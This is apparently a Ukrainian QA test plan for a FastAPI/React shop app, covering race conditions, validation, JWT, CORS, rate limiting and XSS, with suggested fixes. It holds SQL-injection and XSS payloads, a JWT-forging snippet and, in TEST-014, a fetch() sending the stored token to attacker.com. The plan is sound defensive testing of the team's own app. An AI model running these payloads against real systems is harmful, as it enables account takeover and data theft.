# Протоколи тестування системи Python-web

> Дата створення: 2025-11-25  
> Версія системи: 1.0  
> Тестувальник: QA Team

## Зміст

1. [Огляд тестування](#огляд-тестування)
2. [Backend тести](#backend-тести)
3. [Frontend тести](#frontend-тести)
4. [Результати та рекомендації](#результати-та-рекомендації)

## Огляд тестування

### Статус виконання

| Категорія | Всього тестів | Виконано | Пройдено | Провалено | Частково |
|-----------|---------------|----------|----------|-----------|----------|
| Backend Security | 5 | 0 | 0 | 0 | 0 |
| Backend Resilience | 3 | 0 | 0 | 0 | 0 |
| Backend Load | 1 | 0 | 0 | 0 | 0 |
| Frontend Security | 2 | 0 | 0 | 0 | 0 |
| Frontend Resilience | 3 | 0 | 0 | 0 | 0 |
| **ВСЬОГО** | **14** | **0** | **0** | **0** | **0** |

### Легенда статусів
- ✅ **PASSED** - Тест пройдено успішно
- ❌ **FAILED** - Тест провалено, виявлено критичну проблему
- ⚠️ **PARTIAL** - Тест частково пройдено, є зауваження
- ⏳ **PENDING** - Тест очікує виконання

---

## Backend тести

### TEST-001: Реєстрація з дублікатами (Race Condition)

**Категорія**: Resilience  
**Пріоритет**: 🔴 Критичний  
**Статус**: ⏳ PENDING

#### Опис
Перевірити обробку одночасної реєстрації користувачів з однаковим username для виявлення race conditions.

#### Кроки тестування
1. Підготувати 2 паралельних POST запити на `/register` з однаковими даними:
   ```json
   {
     "user_name": "test_race_user",
     "email": "race1@test.com",
     "password": "TestPassword123"
   }
   ```
2. Відправити обидва запити одночасно (asyncio.gather)
3. Перевірити коди відповідей
4. Перевірити кількість користувачів в БД з username="test_race_user"

#### Очікуваний результат
- ✅ Один запит отримує 201 Created + токен
- ✅ Другий запит отримує 400 Bad Request з повідомленням "User already exists"
- ✅ В базі даних тільки 1 користувач з username="test_race_user"

#### Фактичний результат
> _Буде заповнено при виконанні тесту_

#### Виявлені проблеми
> _Буде заповнено при виконанні тесту_

#### Рекомендації
**Якщо тест провалився:**
1. Додати database-level unique constraint (вже є)
2. Обгорнути перевірку та створення в транзакцію
3. Додати обробку IntegrityError:
   ```python
   try:
       db.add(user)
       db.commit()
   except IntegrityError:
       db.rollback()
       raise HTTPException(status_code=400, detail="User already exists")
   ```

---

### TEST-002: Створення замовлення з некоректними даними

**Категорія**: Functional  
**Пріоритет**: 🔴 Критичний  
**Статус**: ⏳ PENDING

#### Опис
Перевірити валідацію даних замовлення на рівні API для захисту від некоректних даних.

#### Кроки тестування
1. **Тест 1 - Від'ємна кількість**:
   ```json
   POST /orders
   {
     "name": "Test",
     "phone": "+380123456789",
     "email": "test@test.com",
     "delivery_method": "courier",
     "address": "Test Address",
     "items": [{"product_name": "Bread", "quantity": -5, "price": 35}]
   }
   ```

2. **Тест 2 - Від'ємна ціна**:
   ```json
   {
     ...,
     "items": [{"product_name": "Bread", "quantity": 5, "price": -100}]
   }
   ```

3. **Тест 3 - Порожній масив товарів**:
   ```json
   {
     ...,
     "items": []
   }
   ```

4. **Тест 4 - Нульова кількість**:
   ```json
   {
     ...,
     "items": [{"product_name": "Bread", "quantity": 0, "price": 35}]
   }
   ```

#### Очікуваний результат
- ✅ Всі 4 запити повертають 422 Unprocessable Entity
- ✅ Замовлення не створюються в базі даних
- ✅ Повідомлення містять зрозумілі пояснення помилок
- ✅ Валідація відбувається на рівні Pydantic схем

#### Фактичний результат
> _Буде заповнено при виконанні тесту_

#### Виявлені проблеми
> _Буде заповнено при виконанні тесту_

#### Рекомендації
**Необхідні зміни в schemas.py:**
```python
from pydantic import BaseModel, Field, validator

class OrderItemCreate(BaseModel):
    product_name: str = Field(..., min_length=1)
    quantity: int = Field(..., gt=0, description="Must be greater than 0")
    price: float = Field(..., ge=0, description="Must be >= 0")

class OrderCreate(BaseModel):
    name: str = Field(..., min_length=1)
    phone: str = Field(..., regex=r'^\+?\d{10,15}$')
    email: str = Field(..., regex=r'^[\w\.-]+@[\w\.-]+\.\w+$')
    items: List[OrderItemCreate] = Field(..., min_items=1)
    ...
```

---

### TEST-003: Транзакційність створення замовлення

**Категорія**: Resilience  
**Пріоритет**: 🔴 Критичний  
**Статус**: ⏳ PENDING

#### Опис
Перевірити, що при помилці створення OrderItem відкочується весь Order (ACID транзакції).

#### Кроки тестування
1. **Підготовка**: Модифікувати код для симуляції помилки:
   ```python
   # В main.py додати після створення Order
   for i, item in enumerate(order.items):
       if i == 1:  # Симуляція помилки на 2-му item
           raise Exception("Simulated error")
       db_item = OrderItem(...)
   ```

2. Створити замовлення з 3 товарами
3. Перевірити базу даних:
   ```sql
   SELECT COUNT(*) FROM orders WHERE name='Test Rollback';
   SELECT COUNT(*) FROM order_items WHERE order_id IN 
     (SELECT id FROM orders WHERE name='Test Rollback');
   ```

#### Очікуваний результат
- ✅ Запит повертає 500 Internal Server Error
- ✅ В таблиці `orders` немає запису з name='Test Rollback'
- ✅ В таблиці `order_items` немає жодного запису для цього замовлення
- ✅ Дані цілісні, немає "сирітських" записів

#### Фактичний результат
> _Буде заповнено при виконанні тесту_

#### Виявлені проблеми
**Очікувана проблема**: Зараз код робить `db.commit()` після створення Order, тому при помилці в OrderItem Order вже збережений.

#### Рекомендації
**Необхідні зміни в main.py:**
```python
@app.post("/orders", response_model=OrderResponse)
def create_order(order: OrderCreate, db: Session = Depends(get_db)):
    try:
        total_price = sum(item.price * item.quantity for item in order.items)
        
        db_order = Order(...)
        db.add(db_order)
        db.flush()  # Отримати ID без коміту
        
        for item in order.items:
            db_item = OrderItem(order_id=db_order.id, ...)
            db.add(db_item)
        
        db.commit()  # Тільки один коміт в кінці
        db.refresh(db_order)
        return OrderResponse(id=db_order.id, message="Order created successfully")
    
    except Exception as e:
        db.rollback()  # Відкат всіх змін
        raise HTTPException(status_code=500, detail=str(e))
```

---

### TEST-004: SQL Injection в полях

**Категорія**: Security  
**Пріоритет**: 🔴 Критичний  
**Статус**: ⏳ PENDING

#### Опис
Перевірити захист від SQL injection атак в різних полях вводу.

#### Кроки тестування
1. **Тест 1 - SQL injection в username при реєстрації**:
   ```json
   POST /register
   {
     "user_name": "admin' OR '1'='1",
     "email": "hacker@test.com",
     "password": "Password123"
   }
   ```

2. **Тест 2 - SQL injection в username при авторизації**:
   ```json
   POST /auth
   {
     "user_name": "admin'--",
     "password": "anypassword"
   }
   ```

3. **Тест 3 - SQL injection в полі name замовлення**:
   ```json
   POST /orders
   {
     "name": "'; DROP TABLE orders; --",
     ...
   }
   ```

4. Перевірити цілісність бази даних після всіх тестів

#### Очікуваний результат
- ✅ Всі запити обробляються безпечно
- ✅ SQLAlchemy ORM автоматично екранує спецсимволи
- ✅ Таблиці не видаляються
- ✅ Дані зберігаються як звичайний текст без виконання SQL
- ✅ Створюється користувач з username = "admin' OR '1'='1" (як текст)

#### Фактичний результат
> _Буде заповнено при виконанні тесту_

#### Очікування
**Тест повинен пройти успішно ✅**, оскільки:
- SQLAlchemy ORM використовує параметризовані запити
- Всі user inputs автоматично екрануються
- Немає raw SQL запитів в коді

---

### TEST-005: JWT токен з компрометованим SECRET_KEY

**Категорія**: Security  
**Пріоритет**: 🔴 Критичний  
**Статус**: ⏳ PENDING

#### Опис
Перевірити можливість підробки JWT токенів при використанні hardcoded SECRET_KEY.

#### Кроки тестування
1. **Перевірити поточний SECRET_KEY** в `auth.py`:
   ```python
   SECRET_KEY = "SECRET_KEY_CHANGE_ME"
   ```

2. **Згенерувати підроблений токен**:
   ```python
   import jwt
   from datetime import datetime, timedelta
   
   fake_payload = {
       "sub": "hacker_admin",
       "role": "admin",
       "exp": datetime.utcnow() + timedelta(hours=24)
   }
   fake_token = jwt.encode(fake_payload, "SECRET_KEY_CHANGE_ME", algorithm="HS256")
   ```

3. **Спробувати отримати доступ**:
   ```bash
   GET /orders/my
   Authorization: Bearer {fake_token}
   ```

4. Перевірити, чи дозволено доступ

#### Очікуваний результат (зараз)
- ❌ **FAILED**: Якщо SECRET_KEY = "SECRET_KEY_CHANGE_ME", то:
  - Підроблений токен приймається
  - Доступ дозволено як admin
  - **КРИТИЧНА ВРАЗЛИВІСТЬ**

#### Бажаний результат (після виправлення)
- ✅ SECRET_KEY зберігається в змінних оточення
- ✅ Підроблений токен з старим ключем відхиляється
- ✅ Повертається 401 Unauthorized

#### Фактичний результат
> _Буде заповнено при виконанні тесту_

#### Рекомендації
**КРИТИЧНО - виправити негайно:**

1. Створити `.env` файл:
   ```env
   SECRET_KEY=your-super-secret-key-min-32-characters-long-random-string
   DATABASE_URL=sqlite:///./users.db
   ```

2. Оновити `auth.py`:
   ```python
   import os
   from dotenv import load_dotenv
   
   load_dotenv()
   
   SECRET_KEY = os.getenv("SECRET_KEY")
   if not SECRET_KEY or SECRET_KEY == "SECRET_KEY_CHANGE_ME":
       raise ValueError("SECRET_KEY must be set in .env file")
   ```

3. Додати `python-dotenv` в `requirements.txt`

4. Додати `.env` в `.gitignore`

---

### TEST-006: Brute-force атака на /auth

**Категорія**: Security  
**Пріоритет**: 🔴 Критичний  
**Статус**: ⏳ PENDING

#### Опис
Перевірити захист від підбору паролів через multiple login attempts.

#### Кроки тестування
1. Створити тестового користувача:
   ```json
   POST /register
   {
     "user_name": "brute_test_user",
     "email": "brute@test.com",
     "password": "CorrectPassword123"
   }
   ```

2. **Спроба підбору паролю** - відправити 100 запитів:
   ```python
   for i in range(100):
       response = requests.post("/auth", json={
           "user_name": "brute_test_user",
           "password": f"WrongPassword{i}"
       })
       log_response(i, response.status_code, response.elapsed)
   ```

3. Аналізувати:
   - Коди відповідей
   - Час відповідей
   - Чи є блокування після N спроб

#### Очікуваний результат (зараз)
- ❌ **FAILED**: Немає захисту:
  - Всі 100 запитів обробляються
  - Всі повертають 400 "Invalid password"
  - Немає rate limiting
  - Немає блокування облікового запису
  - **ВИСОКА ВРАЗЛИВІСТЬ**

#### Бажаний результат (після виправлення)
- ✅ Після 5 невдалих спроб - тимчасове блокування (429 Too Many Requests)
- ✅ Або exponential backoff (уповільнення відповідей)
- ✅ Логування спроб для моніторингу
- ✅ Email нотифікація користувачу про підозрілу активність

#### Фактичний результат
> _Буде заповнено при виконанні тесту_

#### Рекомендації
**Варіанти захисту:**

**Опція 1: slowapi - Rate Limiting**
```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter

@app.post("/auth")
@limiter.limit("5/minute")  # Максимум 5 спроб за хвилину
def auth_user(...):
    ...
```

**Опція 2: Custom middleware з Redis**
```python
# Зберігати в Redis кількість невдалих спроб
# Блокувати IP після 5 спроб на 15 хвилин
```

---

### TEST-007: Rate limiting на /register

**Категорія**: Security / Load  
**Пріоритет**: 🔴 Критичний  
**Статус**: ⏳ PENDING

#### Опис
Перевірити захист від спам-реєстрацій та DDoS атак на endpoint реєстрації.

#### Кроки тестування
1. **Масова реєстрація** - відправити 50 запитів за 10 секунд:
   ```python
   async def spam_register():
       tasks = []
       for i in range(50):
           payload = {
               "user_name": f"spam_user_{i}",
               "email": f"spam{i}@test.com",
               "password": "Password123"
           }
           tasks.append(client.post("/register", json=payload))
       
       responses = await asyncio.gather(*tasks)
       return responses
   ```

2. Аналізувати відповіді:
   - Скільки успішних (201)
   - Скільки заблоковано (429)
   - Час обробки

#### Очікуваний результат (зараз)
- ❌ **FAILED**: 
  - Всі 50 користувачів створюються успішно
  - Немає обмежень
  - Можливість DDoS атаки

#### Бажаний результат (після виправлення)
- ✅ Перші 10 запитів - успішні (201)
- ✅ Наступні запити - 429 Too Many Requests
- ✅ Повідомлення: "Too many registration attempts. Please try again later."

#### Фактичний результат
> _Буде заповнено при виконанні тесту_

#### Рекомендації
```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@app.post("/register")
@limiter.limit("10/hour")  # Максимум 10 реєстрацій з одного IP за годину
def register_user(...):
    ...
```

---

### TEST-008: Валідація сили пароля

**Категорія**: Security  
**Пріоритет**: 🟠 Високий  
**Статус**: ⏳ PENDING

#### Опис
Перевірити вимоги до складності пароля при реєстрації.

#### Кроки тестування
Спробувати зареєструвати користувачів з різними паролями:

1. **Тест 1 - Дуже короткий пароль**:
   ```json
   {"user_name": "weak1", "email": "weak1@test.com", "password": "123"}
   ```

2. **Тест 2 - Односимвольний пароль**:
   ```json
   {"user_name": "weak2", "email": "weak2@test.com", "password": "p"}
   ```

3. **Тест 3 - Тільки літери без цифр**:
   ```json
   {"user_name": "weak3", "email": "weak3@test.com", "password": "password"}
   ```

4. **Тест 4 - Популярний пароль**:
   ```json
   {"user_name": "weak4", "email": "weak4@test.com", "password": "password123"}
   ```

5. **Тест 5 - Хороший пароль** (контроль):
   ```json
   {"user_name": "strong", "email": "strong@test.com", "password": "MyStr0ng!Pass"}
   ```

#### Очікуваний результат (зараз)
- ⚠️ **PARTIAL**: 
  - Всі паролі приймаються (немає валідації)
  - Навіть "123" успішно зберігається

#### Бажаний результат (після виправлення)
- ✅ Тести 1-4 повертають 422 з повідомленням про вимоги
- ✅ Тест 5 успішний (201)
- ✅ Вимоги: мінімум 8 символів, великі/малі літери, цифра, спецсимвол

#### Фактичний результат
> _Буде заповнено при виконанні тесту_

#### Рекомендації
```python
from pydantic import BaseModel, validator
import re

class RegisterRequest(BaseModel):
    user_name: str
    email: str
    password: str
    
    @validator('password')
    def validate_password(cls, v):
        if len(v) < 8:
            raise ValueError('Password must be at least 8 characters')
        if not re.search(r'[A-Z]', v):
            raise ValueError('Password must contain at least one uppercase letter')
        if not re.search(r'[a-z]', v):
            raise ValueError('Password must contain at least one lowercase letter')
        if not re.search(r'\d', v):
            raise ValueError('Password must contain at least one digit')
        # Опційно: спецсимвол
        # if not re.search(r'[!@#$%^&*]', v):
        #     raise ValueError('Password must contain special character')
        return v
```

---

### TEST-009: CORS налаштування

**Категорія**: Security  
**Пріоритет**: 🔴 Критичний  
**Статус**: ⏳ PENDING

#### Опис
Перевірити правильність налаштування CORS для захисту від CSRF атак.

#### Кроки тестування
1. **Перевіритичний код CORS**:
   ```python
   # main.py
   app.add_middleware(
       CORSMiddleware,
       allow_origins=["*"],  # <-- ПРОБЛЕМА!
       ...
   )
   ```

2. **Тест з легітимного origin**:
   ```bash
   curl -H "Origin: http://localhost:5173" \
        -H "Access-Control-Request-Method: POST" \
        -X OPTIONS http://localhost:8000/auth
   ```

3. **Тест з малісного origin**:
   ```bash
   curl -H "Origin: http://malicious-site.com" \
        -H "Access-Control-Request-Method: POST" \
        -X OPTIONS http://localhost:8000/auth
   ```

4. Перевірити response headers:
   - `Access-Control-Allow-Origin`
   - `Access-Control-Allow-Credentials`

#### Очікуваний результат (зараз)
- ❌ **FAILED**:
  - `Access-Control-Allow-Origin: *` для всіх запитів
  - Малісний сайт може робити запити
  - **КРИТИЧНА ВРАЗЛИВІСТЬ для CSRF**

#### Бажаний результат (після виправлення)
- ✅ `Access-Control-Allow-Origin` містить тільки дозволені домени
- ✅ Запити з `malicious-site.com` блокуються

#### Фактичний результат
> _Буде заповнено при виконанні тесту_

#### Рекомендації
```python
# main.py
import os

ALLOWED_ORIGINS = os.getenv("ALLOWED_ORIGINS", "http://localhost:5173").split(",")

app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,  # Конкретні домени
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
)
```

`.env`:
```env
ALLOWED_ORIGINS=http://localhost:5173,https://your-production-domain.com
```

---

### TEST-010: Навантажувальний тест /products

**Категорія**: Load  
**Пріоритет**: 🟡 Середній  
**Статус**: ⏳ PENDING

#### Опис
Перевірити продуктивність endpoint для отримання списку продуктів під навантаженням.

#### Підготовка
1. Додати 1000 продуктів в базу даних:
   ```python
   for i in range(1000):
       product = Product(
           name=f"Product {i}",
           price=10 + i*0.5,
           wholesale_price=8 + i*0.5,
           wholesale_min_quantity=10,
           category="Test Category",
           image="/img/test.png"
       )
       db.add(product)
   db.commit()
   ```

#### Кроки тестування
Використати Locust для симуляції 100 одночасних користувачів:

```python
# locustfile.py
from locust import HttpUser, task, between

class ProductUser(HttpUser):
    wait_time = between(1, 3)
    
    @task
    def get_products(self):
        self.client.get("/products")
```

Запустити:
```bash
locust -f locustfile.py --host=http://localhost:8000 --users=100 --spawn-rate=10
```

#### Метрики для збору
- Середній час відповіді
- 95-й перцентиль часу відповіді
- Кількість помилок
- RPS (requests per second)

#### Очікуваний результат
- ✅ Середній час відповіді < 500ms
- ✅ 95% запитів < 1000ms
- ✅ 0% помилок (status 500)
- ✅ Підтримка мінімум 50 RPS

#### Фактичний результат
> _Буде заповнено при виконанні тесту_

| Метрика | Значення |
|---------|----------|
| Avg Response Time | - |
| 95th Percentile | - |
| Error Rate | - |
| RPS | - |

#### Рекомендації (якщо повільно)
1. Додати pagination для `/products`:
   ```python
   @app.get("/products")
   def get_products(skip: int = 0, limit: int = 50, db: Session = Depends(get_db)):
       return db.query(Product).offset(skip).limit(limit).all()
   ```

2. Додати кешування (Redis):
   ```python
   @cache(expire=300)  # 5 хвилин
   def get_products(...):
       ...
   ```

3. Додати database indexes (вже є на category)

---

## Frontend тести

### TEST-011: Обробка помилки завантаження продуктів

**Категорія**: Resilience  
**Пріоритет**: 🟡 Середній  
**Статус**: ⏳ PENDING

#### Опис
Перевірити UX при недоступності backend або мережевих помилок.

#### Кроки тестування
1. **Симуляція недоступності backend**:
   - Вимкнути backend сервер
   - Відкрити `http://localhost:5173`
   - Спостерігати поведінку MainPage

2. **Симуляція timeout**:
   - Chrome DevTools → Network → Throttling → Offline
   - Перезавантажити сторінку

3. **Симуляція 500 error**:
   - Модифікувати backend для повернення 500
   - Перезавантажити сторінку

#### Очікуваний результат
- ✅ Відображається зрозуміле повідомлення про помилку
- ✅ Є кнопка "Спробувати ще раз" для retry
- ✅ Немає білого екрану
- ✅ Немає необроблених errors в console
- ✅ Skeleton loader під час завантаження

#### Фактичний результат (зараз)
> _Буде заповнено при виконанні тесту_

**Очікувані проблеми**:
- ⚠️ Показується повідомлення, але немає кнопки retry
- ⚠️ Користувач змушений перезавантажувати сторінку

#### Рекомендації
```javascript
// MainPage.jsx
const [error, setError] = useState(null);
const [loading, setLoading] = useState(true);

const fetchProducts = async () => {
  try {
    setLoading(true);
    setError(null);
    const response = await fetch('...', {
      signal: AbortSignal.timeout(10000) // 10s timeout
    });
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    // ...
  } catch (err) {
    setError(err.message);
  } finally {
    setLoading(false);
  }
};

// У render:
{error && (
  <div className="error-message">
    <p>{error}</p>
    <button onClick={fetchProducts}>Спробувати ще раз</button>
  </div>
)}
```

---

### TEST-012: XSS через product name

**Категорія**: Security  
**Пріоритет**: 🔴 Критичний  
**Статус**: ⏳ PENDING

#### Опис
Перевірити санітизацію HTML в назвах продуктів для захисту від XSS.

#### Кроки тестування
1. **Створити продукт з XSS payload** через API:
   ```bash
   POST http://localhost:8000/products
   Authorization: Bearer {admin_token}
   {
     "name": "<script>alert('XSS')</script>",
     "price": 100,
     "category": "Test",
     ...
   }
   ```

2. **Додаткові XSS payloads**:
   ```
   <img src=x onerror="alert('XSS')">
   <svg onload="alert('XSS')">
   "><script>alert(document.cookie)</script>
   ```

3. Відкрити MainPage в браузері

4. Перевірити:
   - Чи виконується JavaScript
   - Як відображається назва продукту
   - Console errors

#### Очікуваний результат
- ✅ JavaScript НЕ виконується
- ✅ Назви відображаються як звичайний текст
- ✅ React автоматично екранує HTML в `{product.name}`
- ✅ Alert не з'являється

#### Фактичний результат
> _Буде заповнено при виконанні тесту_

**Очікування**: Тест повинен пройти ✅, оскільки:
- React за замовчуванням екранує всі змінні в JSX
- `<h4>{product.name}</h4>` безпечно
- Проблема може бути тільки якщо використовується `dangerouslySetInnerHTML`

#### Додаткові перевірки
Переглянути код на наявність:
```javascript
// НЕБЕЗПЕЧНО:
<div dangerouslySetInnerHTML={{__html: product.name}} />

// БЕЗПЕЧНО:
<div>{product.name}</div>
```

---

### TEST-013: Валідація форми замовлення

**Категорія**: Functional  
**Пріоритет**: 🟡 Середній  
**Статус**: ⏳ PENDING

#### Опис
Перевірити валідацію полів форми на frontend перед відправкою на backend.

#### Кроки тестування
1. **Порожні поля**:
   - Відкрити кошик
   - Натиснути "Оформити замовлення"
   - Спробувати submit без заповнення

2. **Некоректний email**:
   - Ввести: `test@`, `test`, `@test.com`
   - Спробувати submit

3. **Некоректний телефон**:
   - Ввести: `123`, `abc`, `+38 (0`
   - Спробувати submit

4. **Довга адреса** (якщо є обмеження):
   - Ввести 1000 символів
   - Спробувати submit

#### Очікуваний результат
- ✅ Форма не відправляється SUBMITTED з невалідними даними
- ✅ Відображаються повідомлення про помилки
- ✅ Невалідні поля підсвічуються (border-red)
- ✅ Focus переходить на перше невалідне поле

#### Фактичний результат (зараз)
> _Буде заповнено при виконанні тесту_

**Очікувана проблема**: HTML5 валідація (`required`, `type="email"`) працює, але немає кастомних повідомлень українською мовою.

#### Рекомендації
```javascript
// MainPage.jsx
const [formErrors, setFormErrors] = useState({});

const validateForm = () => {
  const errors = {};
  
  if (!checkoutForm.name.trim()) {
    errors.name = "Ім'я обов'язкове";
  }
  
  const emailRegex = /^[\w\.-]+@[\w\.-]+\.\w+$/;
  if (!emailRegex.test(checkoutForm.email)) {
    errors.email = "Некоректний email";
  }
  
  const phoneRegex = /^\+?\d{10,15}$/;
  if (!phoneRegex.test(checkoutForm.phone.replace(/[\s()-]/g, ''))) {
    errors.phone = "Некоректний телефон";
  }
  
  setFormErrors(errors);
  return Object.keys(errors).length === 0;
};

const handleCheckoutSubmit = async (e) => {
  e.preventDefault();
  if (!validateForm()) return;
  // ... відправка
};
```

---

### TEST-014: Крадіжка токенів через XSS

**Категорія**: Security  
**Пріоритет**: 🟠 Високий  
**Статус**: ⏳ PENDING

#### Опис
Перевірити можливість доступу до JWT токенів через JavaScript (XSS атака).

#### Кроки тестування
1. **Авторизуватися** в системі

2. **Відкрити DevTools Console**

3. **Спробувати отримати токен**:
   ```javascript
   console.log(localStorage.getItem('token'));
   console.log(localStorage.getItem('role'));
   ```

4. **Симуляція XSS атаки**:
   ```javascript
   // Якщо зловмисник може виконати JavaScript:
   fetch('http://attacker.com/steal', {
     method: 'POST',
     body: JSON.stringify({
       token: localStorage.getItem('token'),
       role: localStorage.getItem('role')
     })
   });
   ```

#### Очікуваний результат (зараз)
- ❌ **FAILED - ВРАЗЛИВІСТЬ**:
  - Токен доступний через `localStorage.getItem('token')`
  - XSS атака може вкрасти токен
  - Немає захисту httpOnly

#### Бажаний результат (після виправлення)
- ✅ Токени зберігаються в httpOnly cookies
- ✅ JavaScript НЕ має доступу до токенів
- ✅ CSRF токен використовується для захисту

#### Фактичний результат
> _Буде заповнено при виконанні тесту_

#### Рекомендації

**КРИТИЧНО - змінити підхід до зберігання токенів:**

**Backend зміни**:
```python
from fastapi.responses import Response

@app.post("/auth")
def auth_user(req: AuthRequest, response: Response, db: Session = Depends(get_db)):
    # ... перевірка credentials
    
    token = create_access_token({...})
    
    # Встановити httpOnly cookie замість повернення токена
    response.set_cookie(
        key="access_token",
        value=f"Bearer {token}",
        httponly=True,  # Захист від XSS
        samesite="lax",  # Захист від CSRF
        secure=True,     # Тільки HTTPS (production)
        max_age=86400    # 24 години
    )
    
    return {"role": user.role}  # Токен НЕ повертається
```

**Frontend зміни**:
```javascript
// AuthPage.jsx
const res = await fetch(endpoint, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  credentials: "include",  // Включити cookies
  body: JSON.stringify(payload),
});

const data = await res.json();
// Токен автоматично в cookie, не потрібно зберігати
localStorage.setItem("role", data.role);  // Тільки роль
```

---

### TEST-015: Обробка timeout при створенні замовлення

**Категорія**: Resilience  
**Пріоритет**: 🟡 Середній  
**Статус**: ⏳ PENDING

#### Опис
Перевірити UX при тайм-ауті мережі під час створення замовлення.

#### Кроки тестування
1. **Підготовка**:
   - Додати товари в кошик
   - Заповнити форму замовлення

2. **Симуляція offline**:
   - Chrome DevTools → Network → Throttling → Offline
   - Натиснути "Підтвердити замовлення"

3. **Симуляція slow 3G**:
   - Network → Throttling → Slow 3G
   - Натиснути "Підтвердити замовлення"
   - Спостерігати поведінку 30+ секунд

4. **Симуляція timeout**:
   - Налаштувати backend затримку 60 секунд
   - Відправити замовлення

#### Очікуваний результат
- ✅ Відображається loader/spinner під час відправки
- ✅ Кнопка "Підтвердити" disabled під час відправки
- ✅ Після timeout (10-30s) показується помилка
- ✅ Користувач може повторити спробу
- ✅ Дані форми НЕ втрачаються
- ✅ Зрозуміле повідомлення: "Не вдалося відправити замовлення. Перевірте з'єднання та спробуйте ще раз"

#### Фактичний результат (зараз)
> _Буде заповнено при виконанні тесту_

**Очікувані проблеми**:
- ⚠️ Немає індикатора завантаження
- ⚠️ Можливо натиснути кнопку кілька разів
- ⚠️ Немає timeout на fetch
- ⚠️ Дані форми втрачаються при помилці

#### Рекомендації
```javascript
// MainPage.jsx
const [isSubmitting, setIsSubmitting] = useState(false);

const handleCheckoutSubmit = async (e) => {
  e.preventDefault();
  setIsSubmitting(true);
  
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 30000); // 30s timeout
    
    const response = await fetch('...', {
      method: 'POST',
      signal: controller.signal,
      ...
    });
    
    clearTimeout(timeoutId);
    
    if (response.ok) {
      setOrderSuccess(true);
      setCartItems([]);
      setCheckoutForm({...});  // Очистити тільки після успіху
    } else {
      throw new Error('Failed to submit order');
    }
  } catch (error) {
    if (error.name === 'AbortError') {
      alert('Час очікування вичерпано. Перевірте з\'єднання та спробуйте ще раз.');
    } else {
      alert('Помилка відправки замовлення. Спробуйте ще раз.');
    }
    // НЕ очищати форму при помилці
  } finally {
    setIsSubmitting(false);
  }
};

// У JSX:
<button 
  type="submit" 
  disabled={isSubmitting}
  className={...}
>
  {isSubmitting ? (
    <>
      <Loader className="animate-spin mr-2" />
      Відправка...
    </>
  ) : (
    'Підтвердити замовлення'
  )}
</button>
```

---

## Результати та рекомендації

### Загальна статистика

| Критичність | Тестів | Пройдено | Провалено | Статус |
|-------------|--------|----------|-----------|--------|
| 🔴 Критична | 7 | 0 | 0 | Очікує виконання |
| 🟠 Висока | 2 | 0 | 0 | Очікує виконання |
| 🟡 Середня | 6 | 0 | 0 | Очікує виконання |

### Очікувані результати (прогноз)

На основі аналізу коду очікується:

| Тест ID | Назва | Прогноз | Обґрунтування |
|---------|-------|---------|---------------|
| TEST-001 | Race Condition | ⚠️ PARTIAL | Є unique constraint, але немає обробки IntegrityError |
| TEST-002 | Валідація даних | ❌ FAILED | Немає Field validators в Pydantic schemas |
| TEST-003 | Транзакції | ❌ FAILED | Commit після Order, до OrderItems |
| TEST-004 | SQL Injection | ✅ PASSED | SQLAlchemy ORM захищає |
| TEST-005 | JWT SECRET | ❌ FAILED | Hardcoded SECRET_KEY |
| TEST-006 | Brute-force | ❌ FAILED | Немає rate limiting |
| TEST-007 | Rate limiting | ❌ FAILED | Немає middleware |
| TEST-008 | Password strength | ❌ FAILED | Немає validators |
| TEST-009 | CORS | ❌ FAILED | allow_origins=["*"] |
| TEST-010 | Load test | ⚠️ PARTIAL | Залежить від кількості продуктів |
| TEST-011 | Error handling | ⚠️ PARTIAL | Є обробка, але немає retry |
| TEST-012 | XSS | ✅ PASSED | React екранує HTML |
| TEST-013 | Form validation | ⚠️ PARTIAL | HTML5 валідація є, кастомної немає |
| TEST-014 | Token theft | ❌ FAILED | localStorage не захищений |
| TEST-015 | Timeout | ⚠️ PARTIAL | Немає timeout та UX індикаторів |

### Пріоритет виправлень

#### 🔴 КРИТИЧНО (виправити НЕГАЙНО)

1. **TEST-005: SECRET_KEY** - Винести в .env
2. **TEST-009: CORS** - Налаштувати конкретні origins
3. **TEST-003: Транзакції** - Один commit в кінці
4. **TEST-014: Token storage** - httpOnly cookies

#### 🟠 ВИСОКИЙ ПРІОРИТЕТ (виправити протягом тижня)

5. **TEST-006: Brute-force** - Rate limiting на /auth
6. **TEST-007: Spam protection** - Rate limiting на /register
7. **TEST-002: Data validation** - Pydantic validators
8. **TEST-008: Password strength** - Validators сили пароля

#### 🟡 СЕРЕДНІЙ ПРІОРИТЕТ (виправити протягом місяця)

9. **TEST-001: Race conditions** - Exception handling
10. **TEST-011: Error UX** - Retry кнопки
11. **TEST-013: Form validation** - Кастомні повідомлення
12. **TEST-015: Timeout UX** - Loaders та timeout
13. **TEST-010: Performance** - Pagination/caching

---

## Додатки

### A. Команди для запуску тестів

```bash
# Backend тести
cd c:\Python-web\server
pytest tests/ -v --cov=. --cov-report=html

# Frontend тести
cd c:\Python-web\client
npm test

# Навантажувальні тести
locust -f tests/load_test.py --host=http://localhost:8000
```

### B. Налаштування тестового середовища

```bash
# Backend
pip install pytest pytest-asyncio httpx pytest-cov locust

# Frontend
npm install --save-dev @testing-library/react @testing-library/jest-dom
```

### C. Чек-лист для QA інженера

- [ ] Встановити всі залежності
- [ ] Створити тестову базу даних
- [ ] Запустити backend на localhost:8000
- [ ] Запустити frontend на localhost:5173
- [ ] Виконати всі тести послідовно
- [ ] Заповнити "Фактичний результат" для кожного тесту
- [ ] Зробити скріншоти критичних проблем
- [ ] Створити GitHub Issues для провалених тестів
- [ ] Оновити документ з результатами
- [ ] Провести ретроспективу з командою

---

**Документ створено**: 2025-11-25  
**Останнє оновлення**: 2025-11-25  
**Версія**: 1.0  
**Автор**: QA Team
